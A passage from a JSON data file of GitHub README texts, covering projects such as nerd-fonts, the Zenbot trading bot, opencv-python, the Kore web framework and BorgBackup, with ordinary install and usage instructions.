Igc3Ryb2tlLXdpZHRoPSIuMDgxNDYiLz48L3N2Zz4%3D\n\n\n[consolas]:https:\/\/www.microsoft.com\/typography\/fonts\/family.aspx?FID=300\n[input-mono]:http:\/\/input.fontbureau.com\/download\/\n[pragmatapro]:https:\/\/www.fsd.it\/shop\/fonts\/pragmatapro\/\n[operator]:https:\/\/www.typography.com\/fonts\/operator\/\n[dank]:https:\/\/dank.sh\/\n\n[release]:https:\/\/github.com\/ryanoasis\/nerd-fonts\/releases\/latest \"Latest Release (external link) \u27b6\"\n[coc]:https:\/\/github.com\/ryanoasis\/nerd-fonts\/blob\/master\/code_of_conduct.md \"Contributor Covenant Code of Conduct\"\n[prs]:http:\/\/makeapullrequest.com \"Make a Pull Request (external link) \u27b6\"\n\n<!--\nFont repos\n-->\n\n[f-arimo]:https:\/\/github.com\/google\/fonts\/tree\/master\/apache\/arimo\n[f-hack]:https:\/\/github.com\/chrissimpkins\/Hack\n[f-a-pro]:https:\/\/www.marksimonson.com\/fonts\/view\/anonymous-pro\n[f-3270]:https:\/\/github.com\/rbanffy\/3270font\n[f-cousine]:https:\/\/fonts.google.com\/specimen\/Cousine\n[f-source]:https:\/\/github.com\/adobe-fonts\/source-code-pro\n[f-liberation]:https:\/\/pagure.io\/liberation-fonts\n[f-terminus]:http:\/\/terminus-font.sourceforge.net\n[f-fira-mono]:https:\/\/github.com\/mozilla\/Fira\n[f-fira-code]:https:\/\/github.com\/tonsky\/FiraCode\n[f-monoid]:https:\/\/github.com\/larsenwork\/monoid\n[f-iosevka]:https:\/\/github.com\/be5invis\/Iosevka\n[f-fant]:https:\/\/github.com\/belluzj\/fantasque-sans\n[f-share]:https:\/\/fonts.google.com\/specimen\/Share+Tech+Mono\n[f-space]:https:\/\/fonts.google.com\/specimen\/Space+Mono\n[f-go-mono]:https:\/\/go.googlesource.com\/image\/+\/master\/font\/gofont\/ttfs\/\n[f-gohu]:http:\/\/font.gohu.org\/\n[f-gohu2]:https:\/\/github.com\/koemaeda\/gohufont-ttf\n[f-mononoki]:https:\/\/madmalik.github.io\/mononoki\/\n[f-hasklig]:https:\/\/github.com\/i-tu\/Hasklig\n[f-ibm-plex]:https:\/\/github.com\/IBM\/plex\n[f-victor]:https:\/\/github.com\/rubjo\/victor-mono\n[f-daddytimemono]:https:\/\/github.com\/BourgeoisBear\/DaddyTimeMono\n[f-agave]:https:\/\/github.com\/agarick\/agave\n[f-ia-writer]:https:\/\/github.com\/iaolo\/iA-Fonts\n\n<!--\nPatched Font internal links\n-->\n\n[p-3270]:patched-fonts\/3270\n[p-anonymous-pro]:patched-fonts\/AnonymousPro\n[p-aurulent]:patched-fonts\/AurulentSansMono\n[p-arimo]:patched-fonts\/Arimo\n[p-bigblueterm]:patched-fonts\/BigBlueTerminal\n[p-bitstream]:patched-fonts\/BitstreamVeraSansMono\n[p-blex]:patched-fonts\/IBMPlexMono\n[p-cousine]:patched-fonts\/Cousine\n[p-dejavu]:patched-fonts\/DejaVuSansMono\n[p-droid]:patched-fonts\/DroidSansMono\n[p-fantasque]:patched-fonts\/FantasqueSansMono\n[p-fira-code]:patched-fonts\/FiraCode\n[p-fira-mono]:patched-fonts\/FiraMono\n[p-heavy-data]:patched-fonts\/HeavyData\n[p-hermit]:patched-fonts\/Hermit\n[p-inconsolata]:patched-fonts\/Inconsolata\n[p-inconsolata-go]:patched-fonts\/InconsolataGo\n[p-inconsolata-lgc]:patched-fonts\/InconsolataLGC\n[p-iosevka]:patched-fonts\/Iosevka\n[p-hack]:patched-fonts\/Hack\n[p-lekton]:patched-fonts\/Lekton\n[p-liberation]:patched-fonts\/LiberationMono\n[p-meslo]:patched-fonts\/Meslo\n[p-monofur]:patched-fonts\/Monofur\n[p-monoid]:patched-fonts\/Monoid\n[p-mplus]:patched-fonts\/MPlus\n[p-noto]:patched-fonts\/Noto\n[p-opendyslexic]:patched-fonts\/OpenDyslexic\n[p-overpass]:patched-fonts\/Overpass\n[p-profont]:patched-fonts\/ProFont\n[p-proggy-clean]:patched-fonts\/ProggyClean\n[p-roboto]:patched-fonts\/RobotoMono\n[p-source-code-pro]:patched-fonts\/SourceCodePro\n[p-terminus]:patched-fonts\/Terminus\n[p-tinos]:patched-fonts\/Tinos\n[p-ubuntu]:patched-fonts\/Ubuntu\n[p-ubuntu-mono]:patched-fonts\/UbuntuMono\n[p-share-tech-mono]:patched-fonts\/ShareTechMono\n[p-space-mono]:patched-fonts\/SpaceMono\n[p-go-mono]:patched-fonts\/Go-Mono\n[p-gohu]:patched-fonts\/Gohu\n[p-mononoki]:patched-fonts\/Mononoki\n[p-code-nr]:patched-fonts\/CodeNewRoman\n[p-hasklig]:patched-fonts\/Hasklig\n[p-victor]:patched-fonts\/VictorMono\n[p-daddytimemono]:patched-fonts\/DaddyTimeMono\n[p-agave]:patched-fonts\/Agave\n[p-im-writing]:patched-fonts\/iA-Writer\n\n\n<!--\nQuick Link Images\n-->\n\n[ql-1]:images\/nerd-fonts-character-logo-md.png \"Latest Release (external link) \u27b6\"\n[ql-2]:images\/nerd-fonts-character-logo-md.png \"\u2193 View Patched Fonts List \u2193\"\n[ql-3]:images\/nerd-fonts-patcher-logo-md.png \"\u2193 Font Patcher Details \u2193\"\n[ql-4]:https:\/\/raw.githubusercontent.com\/wiki\/ryanoasis\/vim-devicons\/screenshots\/v1.0.0\/branding-logo-sm.png \"VimDevIcons Vim Plugin (external link) \u27b6\"\n[ql-5]:images\/nerd-fonts-character-logo-md.png \"Font Package Archive (Zip) Downloads (external link) \u27b6\"\n\n<!--\nPatched Font Statuses\n-->\n\n[w-top]:https:\/\/github.com\/ryanoasis\/nerd-fonts\/wiki\/screenshots\/v1.0.x\/windows-pass-sm.png \"\u2193 Windows Compatibility Status \u2193\"\n[l-top]:https:\/\/github.com\/ryanoasis\/nerd-fonts\/wiki\/screenshots\/v1.0.x\/linux-pass-sm.png \"\u2193 Linux Compatibility Status \u2193\"\n[m-top]:https:\/\/github.com\/ryanoasis\/nerd-fonts\/wiki\/screenshots\/v1.0.x\/mac-pass-sm.png \"\u2193 macOS (OSX) Compatibility Status \u2193\"\n\n[w]:https:\/\/github.com\/ryanoasis\/nerd-fonts\/wiki\/screenshots\/v1.0.x\/windows-pass-sm.png \"Windows status is working \u263a\"\n[l]:https:\/\/github.com\/ryanoasis\/nerd-fonts\/wiki\/screenshots\/v1.0.x\/linux-pass-sm.png \"Linux status is working \u263a\"\n[m]:https:\/\/github.com\/ryanoasis\/nerd-fonts\/wiki\/screenshots\/v1.0.x\/mac-pass-sm.png \"macOS (OSX) status is working \u263a\"\n\n[w2]:https:\/\/github.com\/ryanoasis\/nerd-fonts\/wiki\/screenshots\/v1.0.x\/windows-unknown-sm.png \"Windows status is Unknown\/Un-tested\"\n[l2]:https:\/\/github.com\/ryanoasis\/nerd-fonts\/wiki\/screenshots\/v1.0.x\/linux-unknown-sm.png \"Linux status is Unknown\/Un-tested\"\n[m2]:https:\/\/github.com\/ryanoasis\/nerd-fonts\/wiki\/screenshots\/v1.0.x\/mac-unknown-sm.png \"macOS (OSX) status is Unknown\/Un-tested\"\n\n[s-iosevka]:https:\/\/github.com\/ryanoasis\/nerd-fonts\/issues\/83\n\n"},{"repo":"\/DeviaVir\/zenbot","language":"HTML","readme_contents":"![zenbot logo](assets\/logo.png)\n\n> \u201cTo follow the path, look to the master, follow the master, walk with the master, see through the master, become the master.\u201d\n> \u2013 Zen Proverb\n\n# Zenbot [![Build\/Test Status](https:\/\/travis-ci.org\/DeviaVir\/zenbot.svg?branch=master)](https:\/\/travis-ci.org\/DeviaVir\/zenbot) [![Greenkeeper badge](https:\/\/badges.greenkeeper.io\/DeviaVir\/zenbot.svg)](https:\/\/greenkeeper.io\/)\n\n## Description\n\nZenbot is a command-line cryptocurrency trading bot using Node.js and MongoDB. It features:\n\n- Fully-automated [technical-analysis](https:\/\/stockcharts.com\/school\/doku.php?id=chart_school:technical_indicators:introduction_to_technical_indicators_and_oscillators)-based trading approach\n- Full support for [Binance](https:\/\/www.binance.com\/), [Bitfinex](https:\/\/www.bitfinex.com\/), [Bitstamp](https:\/\/www.bitstamp.net\/), [Bittrex](https:\/\/bittrex.com\/), [CEX.IO](https:\/\/cex.io\/), [GDAX](https:\/\/gdax.com\/), [Gemini](https:\/\/gemini.com\/), [HitBTC](https:\/\/hitbtc.com\/), [Kraken](https:\/\/www.kraken.com\/), [Poloniex](https:\/\/poloniex.com\/), [QuadrigaCX](https:\/\/www.quadrigacx.com\/) and [TheRockTrading](https:\/\/www.therocktrading.com\/), work on further exchange support is ongoing.\n- Plugin architecture for implementing exchange support, or writing new strategies\n- Simulator for [backtesting strategies](https:\/\/gist.github.com\/carlos8f\/b09a734cf626ffb9bb3bcb1ca35f3db4) against historical data\n- \"Paper\" trading mode, operates on a simulated balance while watching the live market\n- Configurable sell stops, buy stops, and (trailing) profit stops\n- Flexible sampling period and trade frequency - averages 1-2 trades\/day with 1h period, 15-50\/day with 5m period\n\n## Disclaimer\n\n- Zenbot is NOT a sure-fire profit machine. Use it AT YOUR OWN RISK.\n- Crypto-currency is still an experiment, and therefore so is Zenbot. Meaning, both may fail at any time.\n- Running a bot, and trading in general requires careful study of the risks and parameters involved. A wrong setting can cause you a major loss.\n- Never leave the bot un-monitored for long periods of time. Zenbot doesn't know when to stop, so be prepared to stop it if too much loss occurs.\n- Often times the default trade parameters will underperform vs. a buy-hold strategy, so run some simulations and find the optimal parameters for your chosen exchange\/pair before going \"all-in\".\n\n## Documentation\n\nThe extensive documentation is located at the [docs-folder](docs\/).\n\n### Questions\n\nFirst have a look at the [docs](docs\/) and there are also [FAQs](docs\/FAQ.md) which may answer your questions.\nIf not, please ask (programming) questions related to Zenbot on Reddit ([subreddit zenbot](https:\/\/reddit.com\/r\/zenbot)).\n\n### Community\n\nJoin the [Zenbot community on Reddit](https:\/\/reddit.com\/r\/zenbot)!\n\n## Donate\n\nP.S., some have asked for how to donate to Zenbot development. We accept donations at **Bitcoin addresses** below:\n\n### carlos8f's BTC (original Zenbot author)\n\n`187rmNSkSvehgcKpBunre6a5wA5hQQop6W`\n\n### DeviaVir's BTC (current maintainer)\n\n`3A5g4GQ2vmjNcnEschCweJJB4umzu66sdY`\n\n![zenbot logo](assets\/zenbot_square.png)\n\nThanks!\n\n## Noteworthy forks\n\n- [bot18](https:\/\/medium.com\/@carlos8f_11468\/introducing-bot18-the-new-crypto-trading-bot-to-supersede-zenbot-and-unleash-the-zalgo-da8464b41e53)\n- [magic8bot](https:\/\/github.com\/notVitaliy\/magic8bot)\n\n- - -\n\n## License: MIT\n\n- Copyright (C) 2018 Carlos Rodriguez\n- Copyright (C) 2018 Terra Eclipse, Inc. (http:\/\/www.terraeclipse.com\/)\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the &quot;Software&quot;), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and\/or sell\ncopies of the Software, and to permit persons to whom the Software is furnished\nto do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in\nall copies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED &quot;AS IS&quot;, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\nSOFTWARE.\n"},{"repo":"\/revolunet\/PythonBooks","language":"CSS","readme_contents":"# PythonBooks\n\nPythonBooks is a showcase of the best free ebooks about Python.\n\nLearn Python, discover new fields, and muscle your brain for free !\n\ncheck it out : http:\/\/pythonbooks.revolunet.com\n\nWe also have a javascript version : http:\/\/jsbooks.revolunet.com\n\n\n## HOW TO ADD YOUR PUBLICATION\n\nIf you find a nice ebook about Python, feel free to fork PythonBooks and add it in a few steps :\n\n- Paste the informations into the JSON file.\n- Please include a .png file for the cover : less than 100Ko.\n- Make a pull request.\n\nAlternatively, you can send us an email with book infos : pythonbooks@revolunet.com\n\nThanks per advance !\n\n\n## HISTORY\n\nHistorically, this project was supposed to be an experimental Apple 'NewsStand' application.\n\nAfter some weeks of work, we discovered that having a functional application wasn't enough.\n\nYou also have to follow various Apple guidelines and use some Apple libraries to be 'NewsStand' compatible.\n\nSo we decided to go full web and this move gave the project a much wider audience.\n\nThanks Apple for giving us this opportunity :)\n\n\n## Licence\n\nThe PythonBooks website is licensed under the MIT license: http:\/\/www.opensource.org\/licenses\/mit-license.php\n\nEach book has his own licence, see book homepage.\n\n## About us\n\nThe revolunet team is specialised in rich web applications development, for mobile or desktop. \n\nCheck out our website : http:\/\/revolunet.com\n"},{"repo":"\/mattmakai\/fullstackpython.com","language":"HTML","readme_contents":"This repository contains the source code for \n[Full Stack Python](https:\/\/www.fullstackpython.com\/).\n\n"},{"repo":"\/jorisvink\/kore","language":"C","readme_contents":"About\n-----\n\nKore (https:\/\/kore.io) is an easy to use web application platform for\nwriting scalable web APIs in C. Its main goals are security, scalability\nand allowing rapid development and deployment of such APIs.\n\nBecause of this Kore is an ideal candidate for building robust, scalable and secure web things.\n\nKey Features\n------------\n* Supports SNI\n* Supports HTTP\/1.1\n* Websocket support\n* Privseps by default\n* TLS enabled by default\n* Optional background tasks\n* Built-in parameter validation\n* Optional asynchronous PostgreSQL support\n* Optional support for page handlers in Python\n* Reload private keys and certificates on-the-fly\n* Automatic X509 certificates via ACME (with privsep)\n* Private keys isolated in separate process (RSA and ECDSA)\n* Default sane TLS ciphersuites (PFS in all major browsers)\n* Modules can be reloaded on-the-fly, even while serving content\n* Worker processes sandboxed on OpenBSD (pledge) and Linux (seccomp)\n* Event driven (epoll\/kqueue) architecture with per CPU worker processes\n* Build your web application as a precompiled dynamic library or single binary\n\nAnd lots more.\n\nLicense\n-------\n* Kore is licensed under the ISC license\n\nDocumentation\n--------------\n[Read the documentation](https:\/\/docs.kore.io\/3.3.0\/)\n\nPerformance\n-----------\nRead the [benchmarks](https:\/\/blog.kore.io\/posts\/benchmarks) blog post.\n\nPlatforms supported\n-------------------\n* Linux\n* OpenBSD\n* FreeBSD\n* MacOS\n\nBuilding Kore\n-------------\nClone this repository or get the latest release at [https:\/\/kore.io\/releases\/3.2.0](https:\/\/kore.io\/releases\/3.2.0).\n\nRequirements\n* openssl (1.0.2, 1.1.0 or 1.1.1)\n  (note: libressl 3.0.0+ works as a replacement)\n\nRequirement for asynchronous curl (optional)\n* libcurl\n\nRequirements for background tasks (optional)\n* pthreads\n\nRequirements for pgsql (optional)\n* libpq\n\nRequirements for python (optional)\n* Python 3.6+\n\nNormal compilation and installation:\n\n```\n$ cd kore\n$ make\n# make install\n```\n\nIf you would like to build a specific flavor, you can enable\nthose by setting a shell environment variable before running **_make_**.\n\n* ACME=1 (compiles in ACME support)\n* CURL=1 (compiles in asynchronous curl support)\n* TASKS=1 (compiles in task support)\n* PGSQL=1 (compiles in pgsql support)\n* DEBUG=1 (enables use of -d for debug)\n* NOHTTP=1 (compiles Kore without HTTP support)\n* NOOPT=1 (disable compiler optimizations)\n* JSONRPC=1 (compiles in JSONRPC support)\n* PYTHON=1 (compiles in the Python support)\n\nNote that certain build flavors cannot be mixed together and you will just\nbe met with compilation errors.\n\nExample applications\n-----------------\nYou can find example applications under **_examples\/_**.\n\nThe examples contain a README file with instructions on how\nto build or use them.\n\nMailing lists\n-------------\n\n**patches@kore.io** - Send patches here, preferably inline.\n\n**users@kore.io** - Questions regarding kore.\n\n\nIf you want to signup to those mailing lists send an empty email to\n\tlistname+subscribe@kore.io\n\n\nOther mailboxes (these are **not** mailing lists):\n\n**security@kore.io** - Mail this email if you think you found a security problem.\n\n**sponsor@kore.io** - If your company would like to sponsor part of Kore development.\n\nMore information can be found on https:\/\/kore.io\/\n"},{"repo":"\/skvark\/opencv-python","language":"Shell","readme_contents":"[![Downloads](http:\/\/pepy.tech\/badge\/opencv-python)](http:\/\/pepy.tech\/project\/opencv-python)\n\n## OpenCV on Wheels\n\n**Unofficial** pre-built OpenCV packages for Python.\n\n### Installation and Usage\n\n1. If you have previous\/other manually installed (= not installed via ``pip``) version of OpenCV installed (e.g. cv2 module in the root of Python's site-packages), remove it before installation to avoid conflicts.\n2. Select the correct package for your environment:\n\n    There are four different packages and you should **select only one of them**. Do not install multiple different packages in the same environment. There is no plugin architecture: all the packages use the same namespace (`cv2`). If you installed multiple different packages in the same environment, uninstall them all with ``pip uninstall`` and reinstall only one package.\n\n    **a.** Packages for standard desktop environments (Windows, macOS, almost any GNU\/Linux distribution)\n\n    - run ``pip install opencv-python`` if you need only main modules\n    - run ``pip install opencv-contrib-python`` if you need both main and contrib modules (check extra modules listing from [OpenCV documentation](https:\/\/docs.opencv.org\/master\/))\n\n    **b.** Packages for server (headless) environments\n\n    These packages do not contain any GUI functionality. They are smaller and suitable for more restricted environments.\n\n    - run ``pip install opencv-python-headless`` if you need only main modules\n    - run ``pip install opencv-contrib-python-headless`` if you need both main and contrib modules (check extra modules listing from [OpenCV documentation](https:\/\/docs.opencv.org\/master\/))\n\n3. Import the package:\n\n    ``import cv2``\n\n    All packages contain haarcascade files. ``cv2.data.haarcascades`` can be used as a shortcut to the data folder. For example:\n\n    ``cv2.CascadeClassifier(cv2.data.haarcascades + \"haarcascade_frontalface_default.xml\")``\n\n5. Read [OpenCV documentation](https:\/\/docs.opencv.org\/master\/)\n\n6. Before opening a new issue, read the FAQ below and have a look at the other issues which are already open.\n\nFrequently Asked Questions\n--------------------------\n\n**Q: Do I need to install also OpenCV separately?**\n\nA: No, the packages are special wheel binary packages and they already contain statically built OpenCV binaries.\n\n**Q: Pip fails with ``Could not find a version that satisfies the requirement ...``?**\n\nA: Most likely the issue is related to too old pip and can be fixed by running ``pip install --upgrade pip``. Note that the wheel (especially manylinux) format does not currently support properly ARM architecture so there are no packages for ARM based platforms in PyPI. However, ``opencv-python`` packages for Raspberry Pi can be found from https:\/\/www.piwheels.org\/.\n\n**Q: Import fails on Windows: ``ImportError: DLL load failed: The specified module could not be found.``?**\n\nA: If the import fails on Windows, make sure you have [Visual C++ redistributable 2015](https:\/\/www.microsoft.com\/en-us\/download\/details.aspx?id=48145) installed. If you are using older Windows version than Windows 10 and latest system updates are not installed, [Universal C Runtime](https:\/\/support.microsoft.com\/en-us\/help\/2999226\/update-for-universal-c-runtime-in-windows) might be also required.\n\nWindows N and KN editions do not include Media Feature Pack which is required by OpenCV. If you are using Windows N or KN edition, please install also [Windows Media Feature Pack](https:\/\/support.microsoft.com\/en-us\/help\/3145500\/media-feature-pack-list-for-windows-n-editions).\n\nIf you have Windows Server 2012+, media DLLs are probably missing too; please install the Feature called \"Media Foundation\" in the Server Manager. Beware, some posts advise to install \"Windows Server Essentials Media Pack\", but this one requires the \"Windows Server Essentials Experience\" role, and this role will deeply affect your Windows Server configuration (by enforcing active directory integration etc.); so just installing the \"Media Foundation\" should be a safer choice.\n\nIf the above does not help, check if you are using Anaconda. Old Anaconda versions have a bug which causes the error, see [this issue](https:\/\/github.com\/skvark\/opencv-python\/issues\/36) for a manual fix.\n\nIf you still encounter the error after you have checked all the previous solutions, download [Dependencies](https:\/\/github.com\/lucasg\/Dependencies) and open the ``cv2.pyd`` (located usually at ``C:\\Users\\username\\AppData\\Local\\Programs\\Python\\PythonXX\\Lib\\site-packages\\cv2``) file with it to debug missing DLL issues.\n\n**Q: I have some other import errors?**\n\nA: Make sure you have removed old manual installations of OpenCV Python bindings (cv2.so or cv2.pyd in site-packages).\n\n**Q: Why the packages do not include non-free algorithms?**\n\nA: Non-free algorithms such as SIFT and SURF are not included in these packages because they are patented and therefore cannot be distributed as built binaries. See this issue for more info: https:\/\/github.com\/skvark\/opencv-python\/issues\/126\n\n**Q: Why the package and import are different (opencv-python vs. cv2)?**\n\nA: It's easier for users to understand ``opencv-python`` than ``cv2`` and it makes it easier to find the package with search engines. `cv2` (old interface in old OpenCV versions was named as `cv`) is the name that OpenCV developers chose when they created the binding generators. This is kept as the import name to be consistent with different kind of tutorials around the internet. Changing the import name or behaviour would be also confusing to experienced users who are accustomed to the ``import cv2``.\n\n## Documentation for opencv-python\n\n[![AppVeyor CI test status (Windows)](https:\/\/img.shields.io\/appveyor\/ci\/skvark\/opencv-python.svg?maxAge=3600&label=Windows)](https:\/\/ci.appveyor.com\/project\/skvark\/opencv-python)\n[![Travis CI test status (Linux and OS X)](https:\/\/img.shields.io\/travis\/skvark\/opencv-python.svg?maxAge=3600&label=Linux+macOS)](https:\/\/travis-ci.org\/skvark\/opencv-python)\n\nThe aim of this repository is to provide means to package each new [OpenCV release](https:\/\/github.com\/opencv\/opencv\/releases) for the most used Python versions and platforms.\n\n### Build process\n\nThe project is structured like a normal Python package with a standard ``setup.py`` file.\nThe build process for a single entry in the build matrices is as follows (see for example ``appveyor.yml`` file):\n\n0. In Linux and MacOS build: get OpenCV's optional C dependencies that we compile against\n\n1. Checkout repository and submodules\n\n   -  OpenCV is included as submodule and the version is updated\n      manually by maintainers when a new OpenCV release has been made\n   -  Contrib modules are also included as a submodule\n\n2. Find OpenCV version from the sources\n3. Install Python dependencies\n\n   - ``setup.py`` installs the dependencies itself, so you need to run it in an environment\n     where you have the rights to install modules with Pip for the running Python\n\n4. Build OpenCV\n\n   -  tests are disabled, otherwise build time increases too much\n   -  there are 4 build matrix entries for each build combination: with and without contrib modules, with and without GUI (headless)\n   -  Linux builds run in manylinux Docker containers (CentOS 5)\n\n5. Rearrange OpenCV's build result, add our custom files and generate wheel\n\n6. Linux and macOS wheels are transformed with auditwheel and delocate, correspondingly\n\n7. Install the generated wheel\n8. Test that Python can import the library and run some sanity checks\n9. Use twine to upload the generated wheel to PyPI (only in release builds)\n\nSteps 1--5 are handled by ``setup.py bdist_wheel``.\n\nThe build can be customized with environment variables.\nIn addition to any variables that OpenCV's build accepts, we recognize:\n\n- ``ENABLE_CONTRIB`` and ``ENABLE_HEADLESS``. Set to ``1`` to build the contrib and\/or headless version\n- ``CMAKE_ARGS``. Additional arguments for OpenCV's CMake invocation. You can use this to make a custom build.\n\n### Licensing\n\nOpencv-python package (scripts in this repository) is available under MIT license.\n\nOpenCV itself is available under [3-clause BSD License](https:\/\/github.com\/opencv\/opencv\/blob\/master\/LICENSE).\n\nThird party package licenses are at [LICENSE-3RD-PARTY.txt](https:\/\/github.com\/skvark\/opencv-python\/blob\/master\/LICENSE-3RD-PARTY.txt).\n\nAll wheels ship with [FFmpeg](http:\/\/ffmpeg.org) licensed under the [LGPLv2.1](http:\/\/www.gnu.org\/licenses\/old-licenses\/lgpl-2.1.html).\n\nLinux and MacOS wheels ship with [Qt 4.8.7](http:\/\/doc.qt.io\/qt-4.8\/lgpl.html) licensed under the [LGPLv2.1](http:\/\/www.gnu.org\/licenses\/old-licenses\/lgpl-2.1.html).\n\n### Versioning\n\n``find_version.py`` script searches for the version information from OpenCV sources and appends also a revision number specific to this repository to the version string.\n\n### Releases\n\nA release is made and uploaded to PyPI when a new tag is pushed to master branch. These tags differentiate packages (this repo might have modifications but OpenCV version stays same) and should be incremented sequentially. In practice, release version numbers look like this:\n\n``cv_major.cv_minor.cv_revision.package_revision`` e.g. ``3.1.0.0``\n\n### Development builds\n\nEvery commit to the master branch of this repo will be built. Possible build artifacts use local version identifiers:\n\n``cv_major.cv_minor.cv_revision+git_hash_of_this_repo`` e.g. ``3.1.0+14a8d39``\n\nThese artifacts can't be and will not be uploaded to PyPI.\n\n### Manylinux wheels\n\nLinux wheels are built using [manylinux](https:\/\/github.com\/pypa\/python-manylinux-demo). These wheels should work out of the box for most of the distros (which use GNU C standard library) out there since they are built against an old version of glibc.\n\nThe default ``manylinux`` images have been extended with some OpenCV dependencies. See [Docker folder](https:\/\/github.com\/skvark\/opencv-python\/tree\/master\/docker) for more info.\n\n### Supported Python versions\n\nPython 2.7 is the only supported version in 2.x series. Python 2.7 support will be dropped in the end of 2019.\n\nPython 3.x releases are provided for officially supported versions (not in EOL).\n\nCurrently, builds for following Python versions are provided:\n\n- 2.7\n- 3.5\n- 3.6\n- 3.7\n- 3.8\n"},{"repo":"\/borgbackup\/borg","language":"C","readme_contents":"|screencast_basic|\n\nMore screencasts: `installation`_, `advanced usage`_\n\nWhat is BorgBackup?\n-------------------\n\nBorgBackup (short: Borg) is a deduplicating backup program.\nOptionally, it supports compression and authenticated encryption.\n\nThe main goal of Borg is to provide an efficient and secure way to backup data.\nThe data deduplication technique used makes Borg suitable for daily backups\nsince only changes are stored.\nThe authenticated encryption technique makes it suitable for backups to not\nfully trusted targets.\n\nSee the `installation manual`_ or, if you have already\ndownloaded Borg, ``docs\/installation.rst`` to get started with Borg.\nThere is also an `offline documentation`_ available, in multiple formats.\n\n.. _installation manual: https:\/\/borgbackup.readthedocs.org\/en\/stable\/installation.html\n.. _offline documentation: https:\/\/readthedocs.org\/projects\/borgbackup\/downloads\n\nMain features\n~~~~~~~~~~~~~\n\n**Space efficient storage**\n  Deduplication based on content-defined chunking is used to reduce the number\n  of bytes stored: each file is split into a number of variable length chunks\n  and only chunks that have never been seen before are added to the repository.\n\n  A chunk is considered duplicate if its id_hash value is identical.\n  A cryptographically strong hash or MAC function is used as id_hash, e.g.\n  (hmac-)sha256.\n\n  To deduplicate, all the chunks in the same repository are considered, no\n  matter whether they come from different machines, from previous backups,\n  from the same backup or even from the same single file.\n\n  Compared to other deduplication approaches, this method does NOT depend on:\n\n  * file\/directory names staying the same: So you can move your stuff around\n    without killing the deduplication, even between machines sharing a repo.\n\n  * complete files or time stamps staying the same: If a big file changes a\n    little, only a few new chunks need to be stored - this is great for VMs or\n    raw disks.\n\n  * The absolute position of a data chunk inside a file: Stuff may get shifted\n    and will still be found by the deduplication algorithm.\n\n**Speed**\n  * performance critical code (chunking, compression, encryption) is\n    implemented in C\/Cython\n  * local caching of files\/chunks index data\n  * quick detection of unmodified files\n\n**Data encryption**\n    All data can be protected using 256-bit AES encryption, data integrity and\n    authenticity is verified using HMAC-SHA256. Data is encrypted clientside.\n\n**Compression**\n    All data can be optionally compressed:\n\n    * lz4 (super fast, low compression)\n    * zstd (wide range from high speed and low compression to high compression\n      and lower speed)\n    * zlib (medium speed and compression)\n    * lzma (low speed, high compression)\n\n**Off-site backups**\n    Borg can store data on any remote host accessible over SSH.  If Borg is\n    installed on the remote host, big performance gains can be achieved\n    compared to using a network filesystem (sshfs, nfs, ...).\n\n**Backups mountable as filesystems**\n    Backup archives are mountable as userspace filesystems for easy interactive\n    backup examination and restores (e.g. by using a regular file manager).\n\n**Easy installation on multiple platforms**\n    We offer single-file binaries that do not require installing anything -\n    you can just run them on these platforms:\n\n    * Linux\n    * Mac OS X\n    * FreeBSD\n    * OpenBSD and NetBSD (no xattrs\/ACLs support or binaries yet)\n    * Cygwin (experimental, no binaries yet)\n    * Linux Subsystem of Windows 10 (experimental)\n\n**Free and Open Source Software**\n  * security and functionality can be audited independently\n  * licensed under the BSD (3-clause) license, see `License`_ for the\n    complete license\n\nEasy to use\n~~~~~~~~~~~\n\nInitialize a new backup repository (see ``borg init --help`` for encryption options)::\n\n    $ borg init -e repokey \/path\/to\/repo\n\nCreate a backup archive::\n\n    $ borg create \/path\/to\/repo::Saturday1 ~\/Documents\n\nNow doing another backup, just to show off the great deduplication::\n\n    $ borg create -v --stats \/path\/to\/repo::Saturday2 ~\/Documents\n    -----------------------------------------------------------------------------\n    Archive name: Saturday2\n    Archive fingerprint: 622b7c53c...\n    Time (start): Sat, 2016-02-27 14:48:13\n    Time (end):   Sat, 2016-02-27 14:48:14\n    Duration: 0.88 seconds\n    Number of files: 163\n    -----------------------------------------------------------------------------\n                   Original size      Compressed size    Deduplicated size\n    This archive:        6.85 MB              6.85 MB             30.79 kB  <-- !\n    All archives:       13.69 MB             13.71 MB              6.88 MB\n\n                   Unique chunks         Total chunks\n    Chunk index:             167                  330\n    -----------------------------------------------------------------------------\n\n\nFor a graphical frontend refer to our complementary project `BorgWeb <https:\/\/borgweb.readthedocs.io\/>`_.\n\nHelping, Donations and Bounties, becoming a Patron\n--------------------------------------------------\n\nYour help is always welcome!\n\nSpread the word, give feedback, help with documentation, testing or development.\n\nYou can also give monetary support to the project, see there for details:\n\nhttps:\/\/www.borgbackup.org\/support\/fund.html\n\nLinks\n-----\n\n* `Main Web Site <https:\/\/borgbackup.readthedocs.org\/>`_\n* `Releases <https:\/\/github.com\/borgbackup\/borg\/releases>`_,\n  `PyPI packages <https:\/\/pypi.python.org\/pypi\/borgbackup>`_ and\n  `ChangeLog <https:\/\/github.com\/borgbackup\/borg\/blob\/master\/docs\/changes.rst>`_\n* `Offline Documentation <https:\/\/readthedocs.org\/projects\/borgbackup\/downloads>`_\n* `GitHub <https:\/\/github.com\/borgbackup\/borg>`_ and\n  `Issue Tracker <https:\/\/github.com\/borgbackup\/borg\/issues>`_.\n* `Web-Chat (IRC) <http:\/\/webchat.freenode.net\/?randomnick=1&channels=%23borgbackup&uio=MTY9dHJ1ZSY5PXRydWUa8>`_ and\n  `Mailing List <https:\/\/mail.python.org\/mailman\/listinfo\/borgbackup>`_\n* `License <https:\/\/borgbackup.readthedocs.org\/en\/stable\/authors.html#license>`_\n* `Security contact <https:\/\/borgbackup.readthedocs.io\/en\/latest\/support.html#security-contact>`_\n\nCompatibility notes\n-------------------\n\nEXPECT THAT WE WILL BREAK COMPATIBILITY REPEATEDLY WHEN MAJOR 